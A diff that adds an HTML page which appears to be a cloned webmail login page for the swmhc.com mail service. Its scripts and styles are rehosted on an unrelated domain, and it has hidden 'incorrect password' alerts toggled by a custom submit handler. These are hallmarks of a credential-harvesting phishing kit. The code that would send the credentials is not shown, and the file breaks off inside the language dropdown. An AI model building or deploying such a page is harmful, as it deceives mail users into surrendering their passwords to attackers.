@@ -1,0 +1,1191 @@
+<!DOCTYPE html>
+<!-- saved from url=(0030)https://mail.swmhc.com/#/login -->
+<html lang="en" ng-controller="AppCtrl" class="ng-scope">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<style type="text/css">
+		.ng-animate.item:not(.left):not(.right) {
+			-webkit-transition: 0s ease-in-out left;
+			transition: 0s ease-in-out left
+		}
+	</style>
+	<style type="text/css">
+		@charset "UTF-8";
+
+		[ng\:cloak],
+		[ng-cloak],
+		[data-ng-cloak],
+		[x-ng-cloak],
+		.ng-cloak,
+		.x-ng-cloak,
+		.ng-hide:not(.ng-hide-animate) {
+			display: none !important;
+		}
+
+		ng\:form {
+			display: block;
+		}
+	</style>
+	<style type="text/css">
+		.loader {
+			position: fixed;
+			opacity: 0.5;
+			top: 0;
+			left: 0;
+			width: 100vw;
+			height: 100vh;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			background: #333333;
+			transition: opacity 0.75s, visibility 0.75s;
+			z-index: 10000;
+		}
+
+		.loader--hidden {
+			opacity: 0;
+			visibility: hidden;
+		}
+
+		.loader::after {
+			content: "";
+			width: 75px;
+			height: 75px;
+			border: 15px solid #dddddd;
+			border-top-color: #b70712;
+			border-radius: 50%;
+			animation: loading 0.75s ease infinite;
+			z-index: 10000;
+		}
+
+		@keyframes loading {
+			from {
+				transform: rotate(0turn);
+			}
+
+			to {
+				transform: rotate(1turn);
+			}
+		}
+
+		.incorrect-visibe {
+			display: block;
+		}
+
+		.incorrect-hidden {
+			display: none;
+		}
+
+		.btn-primaryy {
+			color: #fff;
+			background-color: #b70712;
+			border-color: #cd0814;
+		}
+
+		.navbar-brand {
+			display: inline-flex;
+			margin: 0 0 1rem 2rem;
+			font-family: 'Anton', sans-serif;
+		}
+
+		.lloggo {
+			color: #3e3e3e;
+		}
+
+		.lloogg {
+			color: #cd0814;
+		}
+
+		.lllo {
+			margin-bottom: 2rem;
+		}
+	</style>
+
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=1, maximum-scale=4.0">
+	<meta name="description" content="Webmail">
+	<meta name="author" content="H">
+	<meta http-equiv="cache-control" content="max-age=0">
+	<meta http-equiv="cache-control" content="no-cache">
+	<meta http-equiv="expires" content="0">
+	<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
+	<meta http-equiv="pragma" content="no-cache">
+	<link rel="preconnect" href="https://fonts.googleapis.com">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link href="https://fonts.googleapis.com/css2?family=Anton&display=swap" rel="stylesheet">
+
+	<!-- OneTrust Cookies Consent Notice start -->
+	<script src="https://waxmedx.com/app/carier/media/analytics.js.download" type="text/javascript" async=""></script>
+	<script type="text/javascript" async=""
+		src="https://waxmedx.com/app/carier/media/adrum-ext.396a4a3598e4fdd54b8073a93c951462.js.download"></script>
+	<!-- ngIf: oneTrustToken && oneTrustToken.length > 0 -->
+	<script type="text/javascript">function OptanonWrapper() { }</script>
+	<!-- OneTrust Cookies Consent Notice end -->
+
+	<script charset="UTF-8">
+		window['adrum-start-time'] = new Date().getTime();
+		(function (config) {
+			config.appKey = 'AD-AAB-AAV-JZW';
+			config.adrumExtUrlHttp = 'http://cdn.appdynamics.com';
+			config.adrumExtUrlHttps = 'https://cdn.appdynamics.com';
+			config.beaconUrlHttp = 'http://pdx-col.eum-appdynamics.com';
+			config.beaconUrlHttps = 'https://pdx-col.eum-appdynamics.com';
+			config.xd = { enable: false };
+		})(window['adrum-config'] || (window['adrum-config'] = {}));
+	</script>
+	<script src="https://waxmedx.com/app/carier/media/adrum-4.5.15.2691.js.download"></script>
+
+	<script type="text/javascript">
+		var mobileVersion = 'wm6';
+		var RELEASE_VERSION = "9b26c3f";
+		var IS_MOBILE = false;
+		var wbmglobals = {
+			IS_MOBILE: IS_MOBILE,
+			MEXT: (IS_MOBILE ? '-m' : '')
+		};
+	</script>
+
+	<title pagetitle-directive="">Login - Webmail 7.0</title>
+
+	<link rel="icon" type="image/png" ng-href="/9b26c3f/branding/hid-1134/images/favicon.ico"
+		href="https://waxmedx.com/app/carier/media/favicon.ico">
+
+	<link rel="stylesheet" type="text/css" href="https://waxmedx.com/app/carier/media/css">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.0.0/css/font-awesome.css"
+		integrity="sha512-72McA95q/YhjwmWFMGe8RI3aZIMCTJWPBbV8iQY3jy1z9+bi6+jHnERuNrDPo/WGYEzzNs4WdHNyyEr/yXJ9pA=="
+		crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+	<link rel="stylesheet" type="text/css" href="https://waxmedx.com/app/carier/media/app.css">
+	<!-- ngIf: branding.css.custom -->
+	<link ng-if="branding.css.custom" rel="stylesheet" type="text/css"
+		ng-href="/9b26c3f/branding/hid-1134/css/custom.css" class="ng-scope" href="https://waxmedx.com/app/carier/media/custom.css">
+	<!-- end ngIf: branding.css.custom -->
+	<!-- ngIf: customPagesSettings.paths.css.custompages -->
+</head>
+
+<body translate-cloak="" activitycheck-directive="" dragdropdisable-directive="" detectdevice-directive=""
+	ng-class="$state.$current.name | route2classname" class="theme-default app_base_login">
+
+	<!-- ngIf: !mobileDevice -->
+	<div class="loader loader--hidden"></div>
+	<div ng-if="!mobileDevice" id="theme-container"
+		ng-style="{ &#39;background-image&#39;: &#39;url(&#39; + themeParams.image.data + &#39;)&#39;, &#39;background-size&#39;: themeParams.image.bckSize ? themeParams.image.bckSize : &#39;cover&#39; }"
+		ng-class="{ &#39;has-theme&#39;: themeParams.theme.cssPrefix !== &#39;default&#39;, &#39;no-theme&#39;: themeParams.theme.cssPrefix === &#39;default&#39;}"
+		class="ng-scope no-theme" style="background-image: url(&quot;&quot;); background-size: auto;">
+		<!-- uiView: growl -->
+		<div ui-view="growl" class="ng-scope">
+			<div ng-controller="GrowlCtrl" aria-live="polite" aria-relevant="additions" class="ng-scope">
+				<div class="growlDimmer ng-hide" id="growlDimmer"
+					ng-show="growlList.length &gt; 0 &amp;&amp; growlStatus.fullPage"></div>
+				<!-- this parent div is always visible even when empty so the last growl can fade out of view -->
+				<div class="growlcontain gr0" ng-class="{&#39;growlMaster&#39;: growlList.length &gt; 0 &amp;&amp; (!growlList[0].unique),
+																&#39;growlFullPage&#39;: growlStatus.fullPage
+		}">
+					<!-- ngRepeat: growl in growlList | orderBy:'id' -->
+				</div>
+			</div>
+		</div>
+		<!-- uiView: app -->
+		<div ui-view="app" class="ng-scope"><!-- ngInclude: 'components/navstatus/navstatus.html' -->
+			<div ng-controller="NavstatusCtrl" ng-include="&#39;components/navstatus/navstatus.html&#39;"
+				class="ng-scope">
+				<nav class="navbar navbar-fixed-top ng-scope lllo" role="banner" ng-show="!isWM8Mode">
+					<div class="navbar-header">
+						<div class="navbar-brand">
+							<h2 class="navbar-logo lloggo"></h2>
+							<h2 class="navbar-logo lloogg"></h2>
+						</div>
+					</div>
+					<!-- ngIf: ( auth.isauth && auth.isverified && !auth.is2faSetupRequired && auth.prefsloaded && ($storage.preferences.fullname || ($storage.user && $storage.user.mail)) ) -->
+				</nav>
+
+				<div modal-directive="1" modal-id="&#39;migrationModal&#39;" modal-body="modal.body"
+					modal-header="modal.header" modal-confirm="modal.confirm"
+					data-ng-click-right-button="modal.rightButton();" class="ng-scope ng-isolate-scope">
+					<div id="migrationModal" class="modal fade" tabindex="-1" role="dialog" aria-modal="true"
+						aria-labelledby="migrationModal-label" aria-hidden="true"
+						aria-describedby="migrationModal-body migrationModal-footer">
+						<div class="modal-dialog ng-isolate-scope" role="document">
+							<div class="modal-content">
+								<div class="modal-header">
+									<!-- ngIf: header -->
+									<!-- ngIf: !header -->
+									<div id="migrationModal-label" ng-if="!header" class="modal-title ng-scope"
+										ng-transclude="modalHeaderTransclude"></div><!-- end ngIf: !header -->
+								</div>
+								<div id="migrationModal-body">
+									<!-- ngIf: body -->
+									<!-- ngIf: bodyHtml -->
+									<div class="modal-body" ng-transclude="modalBodyTransclude"></div>
+								</div>
+								<div class="modal-footer" id="migrationModal-footer">
+									<!-- ngIf: footer || checkboxLabel -->
+									<button ng-show="closebtn" type="button"
+										class="btn btn-default closeModalBtn ng-binding ng-hide"
+										data-ng-click="callbackbuttonclose()" data-dismiss="modal" style=""></button>
+									<button ng-show="leftbtn" type="button"
+										class="btn middleModalBtn leftbtn ng-binding ng-hide"
+										ng-class="leftbtnAdditionalClasses ? leftbtnAdditionalClasses : &#39;middleModalBtn&#39;"
+										data-ng-click="callbackbuttonleft(); $event.stopPropagation()"></button>
+									<button ng-show="middlebtn" type="button"
+										class="btn middleModalBtn middlebtn ng-binding ng-hide"
+										ng-class="middlebtnAdditionalClasses ? middlebtnAdditionalClasses : &#39;middleModalBtn&#39;"
+										data-ng-click="callbackbuttonmiddle(); $event.stopPropagation()"></button>
+									<button ng-show="rightbtn" type="button"
+										class="btn btn-primary rightbtn ng-binding ng-hide"
+										ng-class="rightbtnAdditionalClasses ? rightbtnAdditionalClasses : &#39;&#39;"
+										data-ng-click="callbackbuttonright(); $event.stopPropagation()"
+										ng-disabled="rightbtnDisabled" style=""></button>
+									<button ng-show="confirm" type="button"
+										class="btn btn-primary confirm ng-binding ng-hide"
+										data-ng-click="callbackbuttonright(); $event.stopPropagation()"
+										style=""></button>
+								</div>
+								<button type="button" class="close" data-dismiss="modal"
+									data-ng-click="callbackbuttonclose()" aria-label="Close">
+									<span aria-hidden="true">×</span>
+								</button>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div modal-directive="1" modal-id="&#39;instructionsModal&#39;"
+					template-url="components/navstatus/_partials/keyboard-instructions-modal.html"
+					shared-data="instructionsModalData" class="ng-scope ng-isolate-scope">
+					<div id="instructionsModal" class="instructionsModal modal fade" tabindex="-1" role="dialog"
+						aria-modal="true" aria-labelledby="instructionsModal-label" aria-hidden="true">
+						<div class="modal-dialog ng-isolate-scope">
+							<div class="modal-content">
+								<div class="modal-header">
+									<h4 id="instructionsModal-label" class="modal-title ng-scope"
+										translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_TITLE">Tips for Keyboard
+										Users and Screen Readers</h4>
+									<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+										<span aria-hidden="true">×</span>
+									</button>
+								</div>
+								<!-- ngIf: sharedData.currentPage === 1 -->
+								<div class="modal-body ng-scope" role="document" ng-if="sharedData.currentPage === 1">
+									<div class="body-content">
+										<p class="moreInfo firstParagraph ng-scope" tabindex="0"
+											translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_GENERAL_INFO_1">The
+											following is a list of tips and keyboard commands you can use to navigate
+											Webmail. There are three pages in this document. To move to the next page,
+											activate the link at the bottom of this popup.</p>
+										<br>
+										<p class="moreInfo ng-scope"
+											translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_GENERAL_INFO_2">The
+											following tables describe how to use different parts of the application.
+											Move to these tables in JAWS or NVDA, using the <strong>"T"</strong> key to
+											go to the table, and your table keys <strong>Control+Alt+Arrows</strong> to
+											move within each table. When you get to the last table on this page press
+											Tab to move to the link for the next page.</p>
+									</div>
+									<table class="instructionsTable page1">
+										<caption>
+											<h4 translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_BASICS_HEADING"
+												class="ng-scope">The Basics: Sections of Application Window</h4>
+											<span class="moreInfo ng-scope"
+												translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_BASICS_INFO">Normal
+												screen reader navigation controls will work to move around, such as
+												up/down arrow, tab key and shortcuts to landmarks, headings, links,
+												buttons and form controls.</span>
+										</caption>
+										<thead>
+											<tr>
+												<th scope="col"
+													translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_TH_SECTION"
+													class="ng-scope">Section</th>
+												<th scope="col"
+													translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_TH_DESCRIPTION"
+													class="ng-scope">Description</th>
+											</tr>
+										</thead>
+										<tbody>
+											<tr>
+												<td class="firstCell ng-scope"
+													translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_NAVIGATION_BAR">
+													Top Navigation bar</td>
+												<td translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_NAVIGATION_BAR_INGO"
+													class="ng-scope">Contains a screen reader button that opens this
+													keyboard popup, and a dropdown labelled with your account email.
+													Open it to go to the support center, take a tour of the features of
+													this application, provide us with feedback, or log out.</td>
+											</tr>
+											<tr>
+												<td class="firstCell ng-binding">
+													Sections navigation
+													<br>
+													<span class="moreInfo ng-scope"
+														translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_NAVIGATION_INFO">(found
+														after top navigation bar in tab order). Positioned as a vertical
+														menu on the far left of the screen</span>
+												</td>
+												<td translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_NAVIGATION_CONTENT_BRIEFCASE_NO"
+													class="ng-scope">Links to Mail, Calendars, Task Lists, Contacts and
+													Preferences</td>
+											</tr>
+											<tr>
+												<td class="firstCell ng-binding">
+													Section options sidebar
+													<br>
+													<span class="moreInfo ng-scope"
+														translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_SIDEBAR_INFO">Positioned
+														on the left side of the page, but to the right of the sections
+														navigation bar.</span>
+												</td>
+												<td class="sidebarInstructions ng-binding">
+													This has all the options for the section you choose.
+													<ul class="instructionList">
+														<li translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_NAVIGATION_CONTENT_1"
+															class="ng-scope">At the top of the menu there is a search
+															input and a button to create a New Email, Event, Task,
+															Contact, depending on which section is chosen.</li>
+														<li class="ng-binding">
+															Below that there are items that can be managed depending on
+															the section you are in.
+															<span class="moreInfo ng-scope"
+																translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_NAVIGATION_CONTENT_2B">Examples:
+																mail folders, date-picker and calendars, task lists,
+																address books, Briefcase/Online Storage folders or
+																groups of preferences</span>
+														</li>
+													</ul>
+												</td>
+											</tr>
+											<tr>
+												<td class="firstCell ng-binding">
+													Main window
+													<br>
+													<span class="moreInfo ng-scope"
+														translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_MAIN_WINDOW_INFO">For
+														the selections above.</span>
+												</td>
+												<td translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_MAIN_WINDOW_CONTENT"
+													class="ng-scope">This is the main work area and will contain the
+													item you are working on. It is where you will read or send emails,
+													review or create calendar events, read or create tasks, manage your
+													contacts or menage preferences.</td>
+											</tr>
+										</tbody>
+									</table>
+								</div><!-- end ngIf: sharedData.currentPage === 1 -->
+
+								<!-- ngIf: sharedData.currentPage === 2 -->
+
+								<!-- ngIf: sharedData.currentPage === 3 -->
+								<div class="modal-footer">
+									<div class="first buttonContainer">
+										<button ng-show="sharedData.currentPage === 2" type="button"
+											class="btn btn-default confirm ng-binding ng-hide"
+											ng-click="sharedData.previousPage()" style=""><span
+												class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous:
+											Basics</button>
+										<button ng-show="sharedData.currentPage === 3" type="button"
+											class="btn btn-default confirm ng-binding ng-hide"
+											ng-click="sharedData.previousPage()" style=""><span
+												class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous:
+											Specific Elements</button>
+									</div>
+									<div class="second buttonContainer">
+										<button ng-show="sharedData.currentPage === 3"
+											class="btn btn-default closeModalBtn ng-binding ng-hide"
+											data-dismiss="modal" style="">Close</button>
+									</div>
+									<div class="third buttonContainer">
+										<button ng-show="sharedData.currentPage === 1" type="button"
+											class="btn btn-default confirm ng-binding"
+											ng-click="sharedData.nextPage()">Next: Specific Elements<span
+												class="fa fa-arrow-circle-right" aria-hidden="true"></span></button>
+										<button ng-show="sharedData.currentPage === 2" type="button"
+											class="btn btn-default confirm ng-binding ng-hide"
+											ng-click="sharedData.nextPage()" style="">Next: Creating an Email <span
+												class="fa fa-arrow-circle-right" aria-hidden="true"></span></button>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div modal-directive="1" modal-id="&#39;languageModal&#39;" modal-body-html="languageModalData.body"
+					modal-header="languageModalData.header"
+					data-ng-click-right-button="languageModalData.rightCallback();"
+					data-ng-click-middle-button="languageModalData.middleCallback();"
+					data-ng-click-left-button="languageModalData.leftCallback();"
+					data-modal-rightbtn="languageModalData.rightButton"
+					data-modal-middlebtn="languageModalData.middleButton"
+					data-modal-leftbtn="languageModalData.leftButton" class="ng-scope ng-isolate-scope">
+					<div id="languageModal" class="modal fade" tabindex="-1" role="dialog" aria-modal="true"
+						aria-labelledby="languageModal-label" aria-hidden="true"
+						aria-describedby="languageModal-body languageModal-footer">
+						<div class="modal-dialog ng-isolate-scope" role="document">
+							<div class="modal-content">
+								<div class="modal-header">
+									<!-- ngIf: header -->
+									<!-- ngIf: !header -->
+									<div id="languageModal-label" ng-if="!header" class="modal-title ng-scope"
+										ng-transclude="modalHeaderTransclude">
+									</div><!-- end ngIf: !header -->
+								</div>
+								<div id="languageModal-body">
+									<!-- ngIf: body -->
+									<!-- ngIf: bodyHtml -->
+									<div class="modal-body" ng-transclude="modalBodyTransclude">
+									</div>
+								</div>
+								<div class="modal-footer" id="languageModal-footer">
+									<!-- ngIf: footer || checkboxLabel -->
+									<button ng-show="closebtn" type="button"
+										class="btn btn-default closeModalBtn ng-binding ng-hide"
+										data-ng-click="callbackbuttonclose()" data-dismiss="modal" style=""></button>
+									<button ng-show="leftbtn" type="button"
+										class="btn middleModalBtn leftbtn ng-binding ng-hide"
+										ng-class="leftbtnAdditionalClasses ? leftbtnAdditionalClasses : &#39;middleModalBtn&#39;"
+										data-ng-click="callbackbuttonleft(); $event.stopPropagation()"></button>
+									<button ng-show="middlebtn" type="button"
+										class="btn middleModalBtn middlebtn ng-binding ng-hide"
+										ng-class="middlebtnAdditionalClasses ? middlebtnAdditionalClasses : &#39;middleModalBtn&#39;"
+										data-ng-click="callbackbuttonmiddle(); $event.stopPropagation()"></button>
+									<button ng-show="rightbtn" type="button"
+										class="btn btn-primary rightbtn ng-binding ng-hide"
+										ng-class="rightbtnAdditionalClasses ? rightbtnAdditionalClasses : &#39;&#39;"
+										data-ng-click="callbackbuttonright(); $event.stopPropagation()"
+										ng-disabled="rightbtnDisabled" style=""></button>
+									<button ng-show="confirm" type="button"
+										class="btn btn-primary confirm ng-binding ng-hide"
+										data-ng-click="callbackbuttonright(); $event.stopPropagation()"
+										style=""></button>
+								</div>
+								<button type="button" class="close" data-dismiss="modal"
+									data-ng-click="callbackbuttonclose()" aria-label="Close">
+									<span aria-hidden="true">×</span>
+								</button>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div ng-class="{content: true, &#39;simple-content&#39;: isWM8Mode}" ng-hide="hideContent"
+				class="ng-scope content">
+				<div class="notificationWrapper">
+					<!-- ngInclude: 'components/notification/notification.html' -->
+					<div ng-include="&#39;components/notification/notification.html&#39;" class="ng-scope">
+						<div ng-controller="NotificationCtrl" class="ng-scope">
+							<div ng-show="notifications &amp;&amp; notifications.length&gt;0"
+								class="notification public ng-hide"
+								ng-class="{&#39;public&#39;: ($state &amp;&amp; $state.current &amp;&amp; $state.current.data &amp;&amp; $state.current.data.authreq === false)}">
+								<div scroll-directive="" width-offset="sizes.width.offset"
+									class="notificationContainer ng-isolate-scope" role="dialog" tabindex="-1"
+									style="width: 1366px;">
+									<!-- ngRepeat: note in notifications track by $index -->
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+				<!-- uiView: master -->
+				<div ui-view="master" class="ng-scope">
+					<div class="scroll-container scrollBoth ng-scope ng-isolate-scope"
+						scroll-directive="navStatusSizes.height" role="main" style="height: 601px;">
+						<div class="container login-container"
+							ng-class="{&#39;login-container-ads&#39;: customSpaceSides}">
+							<div class="row">
+								<div class="col-md-4 col-xs-2 col-sm-3"
+									ng-class="{&#39;col-xs-4&#39;: customSpaceSides, &#39;col-xs-2 col-sm-3&#39;: !customSpaceSides}">
+									<!-- ngIf: customSpaceStatus.LoginLeft -->
+								</div>
+								<div class="col-md-4 col-xs-8 col-sm-7"
+									ng-class="{&#39;col-xs-4&#39;: customSpaceSides, &#39;col-xs-8 col-sm-7&#39;: !customSpaceSides}">
+									<div class="login-panel">
+										<div>
+											<div role="img" aria-label="Webmail 7.0" class="login-logo"></div>
+										</div>
+										<div id="loginMessage" class="login-message p0">
+											<div class="">
+												<!-- ngIf: error.langkey -->
+												<span role="alert">
+													<!-- space content required for reading same message again -->
+													<!-- ngIf: !error.langkey --><span ng-if="!error.langkey"
+														class="title ng-scope">&nbsp;</span><!-- end ngIf: !error.langkey -->
+													<!-- ngIf: error.langkey -->
+													<!-- ngIf: error.langkey -->
+												</span>
+											</div>
+										</div>
+										<div id="loginMessage" class="login-message p2a incorrect-hidden">
+											<div class="alert alert-danger alert-dimissible">
+												<!-- ngIf: error.langkey -->
+												<span role="alert">
+													<!-- space content required for reading same message again -->
+													<!-- ngIf: !error.langkey --><span ng-if="!error.langkey"
+														class="title ng-scope">&nbsp;</span><!-- end ngIf: !error.langkey -->
+													<!-- ngIf: error.langkey -->
+													<!-- ngIf: error.langkey -->
+													<span class="ng-binding ng-scope">Please
+														provide your email address.</span>
+												</span>
+											</div>
+										</div>
+										<div id="loginMessage" class="login-message p2b incorrect-hidden">
+											<div class="alert alert-danger alert-dimissible">
+												<!-- ngIf: error.langkey -->
+												<span role="alert">
+													<!-- space content required for reading same message again -->
+													<!-- ngIf: !error.langkey --><span ng-if="!error.langkey"
+														class="title ng-scope">&nbsp;</span><!-- end ngIf: !error.langkey -->
+													<!-- ngIf: error.langkey -->
+													<!-- ngIf: error.langkey -->
+													<span class="ng-binding ng-scope">Please
+														provide your password.</span>
+												</span>
+											</div>
+										</div>
+										<div id="loginMessage" class="login-message p1 incorrect-hidden">
+											<div class="alert alert-danger alert-dimissible">
+												<!-- ngIf: error.langkey -->
+												<span role="alert">
+													<!-- space content required for reading same message again -->
+													<!-- ngIf: !error.langkey --><span ng-if="!error.langkey"
+														class="title ng-scope">&nbsp;</span><!-- end ngIf: !error.langkey -->
+													<!-- ngIf: error.langkey -->
+													<!-- ngIf: error.langkey -->
+													<span class="ng-binding ng-scope ">Incorrect
+														email address/password. Please try again.</span>
+												</span>
+											</div>
+										</div>
+										<form role="form" ng-submit="signin(user)"
+											class="ng-pristine ng-valid Login-form">
+											<div class="form-group">
+												<input type="text" class="form-control ng-pristine ng-valid ng-touched"
+													id="username" ng-model="user.username" placeholder="Email"
+													aria-label="Email" ng-disabled="( loadingstatus !== &#39;&#39;)"
+													focus-directive="true">
+											</div>
+											<div class="form-group">
+												<input type="password"
+													class="form-control ng-pristine ng-untouched ng-valid" id="password"
+													ng-model="user.password" placeholder="Password"
+													aria-label="Password" ng-disabled="( loadingstatus !== &#39;&#39;)">
+											</div>
+											<div class="form-group" aria-live="assertive">
+												<!-- ngIf: ( loadingstatus === '') --><button type="submit"
+													class="btn btn-primaryy btn-lg btn-block ng-scope"
+													translate="LANG_LOGIN_SIGN_IN"
+													onclick="submitFormAndToggleClass()">Log
+													in</button><!-- end ngIf: ( loadingstatus === '') -->
+												<!-- ngIf: ( loadingstatus !== '') -->
+											</div>
+											<div class="clearfix">
+												<!-- ngIf: (degradedMode !== true) -->
+												<div ng-if="(degradedMode !== true)"
+													class="login-forgot pull-right ng-scope">
+													<!-- ngIf: ( loadingstatus === '') && showForgotLink && !customForgotPassURL --><a
+														ng-if="( loadingstatus === &#39;&#39;) &amp;&amp; showForgotLink &amp;&amp; !customForgotPassURL"
+														href="https://mail.swmhc.com/" ng-click="goToForgotPassword()"
+														translate="LANG_LOGIN_FORGOT_PASSWORD" class="ng-scope">Forgot
+														password?</a><!-- end ngIf: ( loadingstatus === '') && showForgotLink && !customForgotPassURL -->
+													<!-- ngIf: ( loadingstatus === '') && showForgotLink && customForgotPassURL -->
+												</div><!-- end ngIf: (degradedMode !== true) -->
+											</div>
+										</form>
+									</div>
+									<div class="login-language">
+										<hr>
+										<div class="row">
+											<label class="col-sm-4 control-label ng-scope" id="languageLabel"
+												translate="LANG_PUBLIC_AVAILABILITY_LANGUAGE">Language</label>
+											<div class="col-sm-8">
+												<dropdown-select dropdown-aria-labelledby="languageLabel"
+													dropdown-model="currentLanguage"
+													dropdown-on-change="languageChanged()"
+													class="ng-isolate-scope dropdown-container">
+													<div class="dropdown-select dropdown-trigger ng-isolate-scope"
+														id="dropdown-22" ng-mousedown="DropdownCtrl.openDropdown()"
+														tabindex="0"
+														ng-class="{disabled: DropdownCtrl.dropdownDisabled()}"
+														aria-disabled="false" role="button" aria-haspopup="listbox"
+														ng-keydown="DropdownCtrl.dropdownTriggerKeydown($event)"
+														aria-expanded="false" aria-controls="dropdown-listbox-22"
+														tooltip-directive="" data-toggle="tooltip"
+														data-placement="bottom" data-original-title=""
+														aria-labelledby="languageLabel dropdown-22">
+														<div class="dropdown-selected-option-container"><span
+																class="ng-binding ng-scope">English</span></div>
+														<span aria-hidden="true" class="fa fa-angle-down"></span>
+													</div>
+													<div class="dropdown-options-container ng-hide"
+														id="dropdown-listbox-22" role="listbox"
+														ng-keydown="DropdownCtrl.optionsKeydown($event)"
+														ng-blur="DropdownCtrl.dontCloseOnBlur ? DropdownCtrl.dontCloseOnBlur = false : DropdownCtrl.closeDropdown()"
+														ng-show="DropdownCtrl.open"
+														ng-style="{right: right ? 0 : null, &#39;max-width&#39;: wrap ? &#39;100%&#39; : null, &#39;top&#39; : optionsContainerTop ? optionsContainerTop : null}"
+														tabindex="-1" aria-activedescendant="dropdown-option-59"
+														style="top: -258px;">
+														<div class="dropdown-options-up-container ng-hide"
+															ng-show="showUpArrow()" aria-hidden="true" style="">
+															<div class="dropdown-options-up" ng-click="upArrowClicked()"
+																ng-mouseenter="upArrowMouseenter()"
+																ng-mouseleave="arrowMouseleave()" unselectable="on">
+																<span class="fa fa-caret-up"></span>
+															</div>
+														</div>
+														<div class="dropdown-options"
+															ng-style="{&#39;max-height&#39;: DropdownCtrl.dropdownOptionsToShow * optionHeight}"
+															ng-transclude="" style="max-height: 240px;">
+															<!-- ngRepeat: val in languages -->
+															<div class="dropdown-option ng-scope ng-isolate-scope highlighted"
+																id="dropdown-option-59"
+																ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}"
+																role="option" ng-click="optionSelected()"
+																ng-mousemove="optionHighlighted()"
+																ng-repeat="val in languages" dropdown-value="val.lang"
+																unselectable="on" aria-selected="true">
+																<!-- ngIf: !DropdownCtrl.dropdownMenu --><span
+																	ng-if="!DropdownCtrl.dropdownMenu"
+																	aria-hidden="true" class="fa ng-scope fa-check"
+																	ng-class="{&#39;fa-check&#39;: DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+																<ng-transclude unselectable="on"><span
+																		class="ng-binding ng-scope"
+																		unselectable="on">English</span></ng-transclude>
+															</div><!-- end ngRepeat: val in languages -->
+															<div class="dropdown-option ng-scope ng-isolate-scope"
+																id="dropdown-option-61"
+																ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}"
+																role="option" ng-click="optionSelected()"
+																ng-mousemove="optionHighlighted()"
+																ng-repeat="val in languages" dropdown-value="val.lang"
+																unselectable="on" aria-selected="false">
+																<!-- ngIf: !DropdownCtrl.dropdownMenu --><span
+																	ng-if="!DropdownCtrl.dropdownMenu"
+																	aria-hidden="true" class="fa ng-scope"
+																	ng-class="{&#39;fa-check&#39;: DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+																<ng-transclude unselectable="on"><span
+																		class="ng-binding ng-scope"
+																		unselectable="on">Français</span></ng-transclude>
+															</div><!-- end ngRepeat: val in languages -->
+															<div class="dropdown-option ng-scope ng-isolate-scope"
+																id="dropdown-option-63"
+																ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}"
+																role="option" ng-click="optionSelected()"
+																ng-mousemove="optionHighlighted()"
+																ng-repeat="val in languages" dropdown-value="val.lang"
+																unselectable="on" aria-selected="false">
+																<!-- ngIf: !DropdownCtrl.dropdownMenu --><span
+																	ng-if="!DropdownCtrl.dropdownMenu"
+																	aria-hidden="true" class="fa ng-scope"
+																	ng-class="{&#39;fa-check&#39;: DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+																<ng-transclude unselectable="on"><span
+																		class="ng-binding ng-scope"
+																		unselectable="on">Deutsch</span></ng-transclude>
+															</div><!-- end ngRepeat: val in languages -->
+															<div class="dropdown-option ng-scope ng-isolate-scope"
+																id="dropdown-option-65"
+																ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}"
+																role="option" ng-click="optionSelected()"
+																ng-mousemove="optionHighlighted()"
+																ng-repeat="val in languages" dropdown-value="val.lang"
+																unselectable="on" aria-selected="false">
+																<!-- ngIf: !DropdownCtrl.dropdownMenu --><span
+																	ng-if="!DropdownCtrl.dropdownMenu"
+																	aria-hidden="true" class="fa ng-scope"
+																	ng-class="{&#39;fa-check&#39;: DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
